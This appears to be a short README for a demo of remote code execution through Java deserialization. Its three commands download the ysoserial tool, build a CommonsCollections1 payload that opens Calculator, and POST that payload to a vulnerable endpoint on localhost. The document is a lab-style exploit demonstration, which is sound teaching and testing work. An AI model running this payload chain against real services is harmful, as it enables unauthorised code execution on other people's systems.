# Remote Code Execution Demo

## How To: Exploit vulnerability to perform RCE 

1. Download ysoserial.jar
```
curl -o ysoserial.jar https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT-b7d0f27b46-1/ysoserial-master-SNAPSHOT-b7d0f27b46-1.jar
```
2. Generate malicious payload
```
java -jar --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED ysoserial.jar CommonsCollections1 "open -a Calculator" > payload.bin
```
3. Send the payload to the vulnerable endpoint
```
curl -X POST http://localhost:8080/vulnerable --data-binary @payload.bin -H 'Content-Type: application/octet-stream'
```